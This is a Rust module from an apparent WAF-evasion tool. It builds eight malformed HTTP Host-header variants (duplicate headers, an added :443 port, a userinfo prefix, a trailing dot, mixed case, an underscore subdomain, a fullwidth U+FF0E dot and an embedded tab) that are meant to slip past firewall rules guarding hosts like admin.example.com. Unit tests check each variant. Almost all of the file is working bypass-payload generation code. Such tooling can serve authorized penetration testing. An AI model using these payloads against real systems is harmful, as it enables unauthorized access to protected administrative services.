//! Host-header parser-differential probes.
//!
//! Exploits parsing disagreements on the HTTP `Host` header (the
//! virtual-host router on every multi-tenant origin). A WAF that
//! gates by `Host: protected.example.com` checks one byte form; the
//! origin's reverse proxy / vhost matcher may normalize, percent-
//! decode, lowercase, or split differently. Every probe in this
//! module crafts a Host-header byte form that means one thing to a
//! literal-string WAF rule and another to a real host-routing
//! pipeline.
//!
//! Each probe emits ONE or TWO `(Host, value)` header pairs. Splice
//! into the outgoing HTTP request (HTTP/1.1 `Host:` or HTTP/2
//! `:authority`, which the artifact represents in HTTP/1.1 form).

use wafrift_types::canary::Canary;
use wafrift_types::pick::pick_from;
use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};

/// Which Host-header parser-differential variant to emit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HostSmuggleTechnique {
    /// Two `Host:` headers — `Host: benign.com\r\nHost: <target>`.
    /// RFC 7230 says reject; many WAFs only check the first while
    /// the origin uses the last.
    DuplicateHostHeaderLastWins,
    /// `Host: <target>:443` — explicit port. Origins normalize the
    /// default port away (443 over TLS, 80 over plain); WAFs that
    /// match on literal `<target>` miss `<target>:443`.
    HostWithDefaultPort,
    /// `Host: user@<target>` — userinfo prefix. RFC 3986 forbids
    /// userinfo in Host; lenient parsers strip it and route to
    /// `<target>`, strict parsers reject.
    HostWithUserinfo,
    /// `Host: <target>.` — trailing dot (FQDN root). DNS resolves
    /// identically; literal-string WAF rules miss the trailing
    /// dot.
    HostWithTrailingDot,
    /// `Host: <TARGET-WITH-CASE-MIX>` — randomized case. RFC 3986
    /// says host is case-insensitive; case-sensitive WAF rules
    /// miss.
    HostWithCaseMix,
    /// `Host: <prefix>_<target>` — underscore-prefixed subdomain.
    /// RFC 3986 forbids `_` in hostnames; some parsers accept it
    /// for backward compat (Windows hostnames, internal services).
    HostWithUnderscoreSubdomain,
    /// `Host: <target with fullwidth dot>` — U+FF0E replaces ASCII
    /// `.`. Backends NFKC-normalize and resolve to <target>; WAFs
    /// see a different UTF-8 byte sequence.
    HostWithFullwidthDot,
    /// `Host: <target>\t<wafrift>` — TAB byte inside the value.
    /// HTTP whitespace rules allow leading/trailing OWS but not
    /// embedded; lenient parsers strip, others reject.
    HostWithEmbeddedTab,
}

impl HostSmuggleTechnique {
    /// Stable kebab-case technique name.
    #[must_use]
    pub fn technique_name(&self) -> &'static str {
        match self {
            Self::DuplicateHostHeaderLastWins => "host.duplicate-header-last-wins",
            Self::HostWithDefaultPort => "host.with-default-port",
            Self::HostWithUserinfo => "host.with-userinfo",
            Self::HostWithTrailingDot => "host.with-trailing-dot",
            Self::HostWithCaseMix => "host.with-case-mix",
            Self::HostWithUnderscoreSubdomain => "host.with-underscore-subdomain",
            Self::HostWithFullwidthDot => "host.with-fullwidth-dot",
            Self::HostWithEmbeddedTab => "host.with-embedded-tab",
        }
    }

    /// One-line operator description.
    #[must_use]
    pub fn description(&self) -> &'static str {
        match self {
            Self::DuplicateHostHeaderLastWins => {
                "Duplicate Host header — first-vs-last resolution differential"
            }
            Self::HostWithDefaultPort => {
                "Host with explicit default port — literal-match WAF rule bypass"
            }
            Self::HostWithUserinfo => {
                "Host with userinfo prefix — RFC 3986 strip-vs-reject differential"
            }
            Self::HostWithTrailingDot => {
                "Trailing-dot FQDN — DNS-equivalent, byte-different differential"
            }
            Self::HostWithCaseMix => {
                "Mixed-case host — case-sensitivity differential"
            }
            Self::HostWithUnderscoreSubdomain => {
                "Underscore in subdomain — RFC 3986 forbidden, accepted by lenient parsers"
            }
            Self::HostWithFullwidthDot => {
                "U+FF0E fullwidth dot — NFKC normalization differential"
            }
            Self::HostWithEmbeddedTab => {
                "Embedded TAB in host value — strip-vs-reject differential"
            }
        }
    }
}

/// Benign decoy hostnames used for the duplicate-header variant's
/// first slot. Operators reading the JSON can swap if the target
/// uses one of these.
const BENIGN_HOST_POOL: &[&str] = &[
    "www.example.com",
    "cdn.example.org",
    "static.example.net",
];

/// One Host-header parser-differential smuggle probe.
#[derive(Debug, Clone)]
pub struct HostSmuggleProbe {
    /// Correlation token.
    pub canary: Canary,
    /// Variant.
    pub technique: HostSmuggleTechnique,
    /// Header pairs to splice into the outgoing request. Most
    /// variants produce ONE `(Host, value)` pair; the duplicate-
    /// header variant produces two.
    pub headers: Vec<(String, String)>,
}

fn mix_case(host: &str) -> String {
    // Alternate case per character so the output differs from the
    // input byte-for-byte but resolves identically.
    host.chars()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                c.to_ascii_uppercase()
            } else {
                c.to_ascii_lowercase()
            }
        })
        .collect()
}

impl HostSmuggleProbe {
    /// Build a probe for a given technique + target host. `target`
    /// is the protected hostname a WAF gates (e.g. `admin.example.com`).
    #[must_use]
    pub fn new(technique: HostSmuggleTechnique, target: &str) -> Self {
        let headers = match technique {
            HostSmuggleTechnique::DuplicateHostHeaderLastWins => {
                let benign = pick_from(BENIGN_HOST_POOL, "www.example.com");
                vec![
                    ("Host".to_string(), benign.to_string()),
                    ("Host".to_string(), target.to_string()),
                ]
            }
            HostSmuggleTechnique::HostWithDefaultPort => {
                vec![("Host".to_string(), format!("{target}:443"))]
            }
            HostSmuggleTechnique::HostWithUserinfo => {
                vec![("Host".to_string(), format!("wafrift@{target}"))]
            }
            HostSmuggleTechnique::HostWithTrailingDot => {
                vec![("Host".to_string(), format!("{target}."))]
            }
            HostSmuggleTechnique::HostWithCaseMix => {
                vec![("Host".to_string(), mix_case(target))]
            }
            HostSmuggleTechnique::HostWithUnderscoreSubdomain => {
                // Insert `_smuggle.` prefix so a label contains `_`.
                vec![("Host".to_string(), format!("_smuggle.{target}"))]
            }
            HostSmuggleTechnique::HostWithFullwidthDot => {
                // Replace ALL ASCII dots with U+FF0E.
                let swapped = target.replace('.', "\u{FF0E}");
                vec![("Host".to_string(), swapped)]
            }
            HostSmuggleTechnique::HostWithEmbeddedTab => {
                vec![("Host".to_string(), format!("{target}\twafrift"))]
            }
        };
        Self {
            canary: Canary::generate(),
            technique,
            headers,
        }
    }
}

impl SmuggleProbe for HostSmuggleProbe {
    fn canary(&self) -> &Canary {
        &self.canary
    }
    fn technique(&self) -> String {
        self.technique.technique_name().to_string()
    }
    fn description(&self) -> &str {
        self.technique.description()
    }
    fn artifact(&self) -> SmuggleArtifact {
        SmuggleArtifact::Headers(self.headers.clone())
    }
}

/// Every Host-header smuggle variant against the given target.
/// Returns 8 probes — one per [`HostSmuggleTechnique`] variant.
#[must_use]
pub fn all_variants(target: &str) -> Vec<HostSmuggleProbe> {
    use HostSmuggleTechnique::*;
    [
        DuplicateHostHeaderLastWins,
        HostWithDefaultPort,
        HostWithUserinfo,
        HostWithTrailingDot,
        HostWithCaseMix,
        HostWithUnderscoreSubdomain,
        HostWithFullwidthDot,
        HostWithEmbeddedTab,
    ]
    .iter()
    .map(|t| HostSmuggleProbe::new(*t, target))
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    const TARGET: &str = "admin.example.com";

    #[test]
    fn all_variants_emits_one_per_technique() {
        assert_eq!(all_variants(TARGET).len(), 8);
    }

    #[test]
    fn every_probe_uses_host_family_namespace() {
        for p in all_variants(TARGET) {
            assert!(p.technique().starts_with("host."), "got {}", p.technique());
        }
    }

    #[test]
    fn every_probe_emits_at_least_one_host_header_pair() {
        for p in all_variants(TARGET) {
            match p.artifact() {
                SmuggleArtifact::Headers(hs) => {
                    assert!(!hs.is_empty());
                    for (name, _) in &hs {
                        assert_eq!(name, "Host", "all pairs must be Host");
                    }
                }
                other => panic!("expected Headers, got {other:?}"),
            }
        }
    }

    #[test]
    fn duplicate_header_variant_emits_two_pairs() {
        let p = HostSmuggleProbe::new(
            HostSmuggleTechnique::DuplicateHostHeaderLastWins,
            TARGET,
        );
        match p.artifact() {
            SmuggleArtifact::Headers(hs) => {
                assert_eq!(hs.len(), 2);
                // Last pair must be the target (last-wins variant).
                assert_eq!(hs[1].1, TARGET);
                // First pair is a decoy from the benign pool.
                assert_ne!(hs[0].1, TARGET);
            }
            _ => panic!("expected Headers"),
        }
    }

    #[test]
    fn default_port_variant_appends_443() {
        let p = HostSmuggleProbe::new(HostSmuggleTechnique::HostWithDefaultPort, TARGET);
        assert!(
            p.headers[0].1.ends_with(":443"),
            "got {:?}",
            p.headers[0].1
        );
    }

    #[test]
    fn userinfo_variant_contains_at_sign() {
        let p = HostSmuggleProbe::new(HostSmuggleTechnique::HostWithUserinfo, TARGET);
        assert!(p.headers[0].1.contains('@'));
        assert!(p.headers[0].1.ends_with(TARGET));
    }

    #[test]
    fn trailing_dot_variant_ends_with_dot() {
        let p = HostSmuggleProbe::new(HostSmuggleTechnique::HostWithTrailingDot, TARGET);
        assert!(p.headers[0].1.ends_with('.'));
    }

    #[test]
    fn case_mix_variant_differs_from_target_byte_for_byte() {
        let p = HostSmuggleProbe::new(HostSmuggleTechnique::HostWithCaseMix, TARGET);
        let v = &p.headers[0].1;
        assert_ne!(v.as_str(), TARGET);
        // Still resolves to the same host (case-insensitive equality).
        assert_eq!(v.to_lowercase(), TARGET.to_lowercase());
    }

    #[test]
    fn underscore_subdomain_variant_contains_underscore() {
        let p = HostSmuggleProbe::new(
            HostSmuggleTechnique::HostWithUnderscoreSubdomain,
            TARGET,
        );
        assert!(p.headers[0].1.contains('_'));
    }

    #[test]
    fn fullwidth_dot_variant_uses_ff0e_bytes() {
        let p = HostSmuggleProbe::new(HostSmuggleTechnique::HostWithFullwidthDot, TARGET);
        let bytes = p.headers[0].1.as_bytes();
        // U+FF0E (FULLWIDTH FULL STOP) in UTF-8 is EF BC 8E.
        assert!(
            bytes.windows(3).any(|w| w == [0xEF, 0xBC, 0x8E]),
            "got bytes {bytes:?}"
        );
    }

    #[test]
    fn embedded_tab_variant_contains_tab_byte() {
        let p = HostSmuggleProbe::new(HostSmuggleTechnique::HostWithEmbeddedTab, TARGET);
        assert!(p.headers[0].1.contains('\t'));
    }

    #[test]
    fn canaries_are_unique_per_probe() {
        let probes = all_variants(TARGET);
        let tokens: HashSet<String> =
            probes.iter().map(|p| p.canary().token.clone()).collect();
        assert_eq!(tokens.len(), probes.len());
    }

    #[test]
    fn descriptions_are_non_empty_and_distinct() {
        let probes = all_variants(TARGET);
        let descs: HashSet<&str> = probes.iter().map(|p| p.description()).collect();
        assert_eq!(descs.len(), probes.len(), "descriptions must be distinct");
        for p in &probes {
            assert!(!p.description().is_empty());
        }
    }

    #[test]
    fn technique_names_are_distinct() {
        let probes = all_variants(TARGET);
        let techs: HashSet<String> = probes.iter().map(|p| p.technique()).collect();
        assert_eq!(techs.len(), probes.len());
    }

    #[test]
    fn custom_target_appears_in_artifact() {
        let custom = "internal-admin.example.org";
        let p = HostSmuggleProbe::new(HostSmuggleTechnique::HostWithTrailingDot, custom);
        assert!(p.headers[0].1.contains(custom));
    }
}
